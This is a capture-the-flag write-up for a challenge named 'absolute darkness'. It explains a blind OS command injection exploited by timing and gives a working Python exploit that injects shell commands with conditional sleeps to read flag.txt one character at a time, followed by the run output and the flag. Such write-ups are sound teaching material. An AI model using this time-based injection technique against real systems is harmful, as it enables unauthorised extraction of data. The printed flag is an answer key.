# absolute darkness

## Write-up

This one can be seen as a blind OS command injection where we have to do some 
time analysis in order to retrieve the command output.  
The idea is to compare the flag's characters one at a time against all possible 
characters pointed out in the regex (alphanumeric + underscore). 

Here's a [script](./xpl.py) that automates this process, `TIMEOUT` and `SLEEP` may 
be altered according to your latency to the challenge host.  

```python
#!/usr/bin/python3
from string import ascii_letters, digits
from pwn import *

HOST, PORT = "localhost", 1337
CHARSET = "_}" + ascii_letters + digits
# Increase these if latency to the challenge is high
TIMEOUT = 0.05
SLEEP = 0.1


flag = "shellmates{"
r = remote(HOST, PORT)
r.recvuntil("$ ")

while "}" not in flag:
    for char in CHARSET:
        r.sendline(
            f"[ `cut -c{len(flag) + 1} flag.txt` = {char} ] && sleep {SLEEP}"
        )
        if not r.recvuntil("$ ", timeout=TIMEOUT):
            r.recvuntil("$ ")
            flag += char
            r.success(f"{flag}")
            break
```

Run the exploit:  

```
$ python3 xpl.py
[+] Opening connection to localhost on port 6002: Done
[+] shellmates{i
[+] shellmates{i_
[+] shellmates{i_S
[+] shellmates{i_ST
[+] shellmates{i_STi
[+] shellmates{i_STil
[+] shellmates{i_STilL
[+] shellmates{i_STilL_
[+] shellmates{i_STilL_c
[+] shellmates{i_STilL_c4
[+] shellmates{i_STilL_c4n
[+] shellmates{i_STilL_c4n_
[+] shellmates{i_STilL_c4n_S
[+] shellmates{i_STilL_c4n_SE
[+] shellmates{i_STilL_c4n_SEE
[+] shellmates{i_STilL_c4n_SEE}
```

## Flag

`shellmates{i_STilL_c4n_SEE}`
